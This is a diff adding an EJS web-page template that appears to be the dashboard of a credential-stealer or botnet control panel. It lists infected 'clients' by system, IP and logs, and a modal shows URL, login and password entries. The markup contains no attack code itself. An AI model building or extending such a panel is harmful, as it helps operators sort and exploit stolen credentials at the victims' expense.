@@ -1,0 +1,53 @@
+<% layout('layout') -%>
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="card bg-dark">
+                <div class="card-body">
+                    <div class="table-responsive-xl" id="clients-table">
+                        <p class="card-text" id="info-country-list"></p>
+                        <input class="form-control form-control-sm" type="text" id="clients-search" placeholder="Search">
+                        <table class="table table-borderless" style="display:none">
+                            <thead>
+                                <tr>
+                                    <th scope="col">System</th>
+                                    <th scope="col">IP</th>
+                                    <th scope="col">DomainDetect</th>
+                                    <th scope="col">Logs</th>
+                                    <th scope="col">Action</th>
+                                </tr>
+                            </thead>
+                            <tbody id="clients">
+                            </tbody>
+                        </table>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="modal fade" id="modal-block" tabindex="-1" role="dialog" aria-labelledby="modal-block" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title"><span id="modal-title"></span></h5>
+                    <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+                </div>
+                <div class="modal-body">
+                    <table class="table table-borderless" style="display:none">
+                        <input class="form-control form-control-sm" type="text" id="modal-search" placeholder="Search">
+                        <thead>
+                            <tr>
+                                <th scope="col">#</th>
+                                <th scope="col">URL</th>
+                                <th scope="col">Login</th>
+                                <th scope="col">Password</th>
+                            </tr>
+                        </thead>
+                        <tbody></tbody>
+                    </table>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script type="application/javascript" src="/js/main.js"></script>
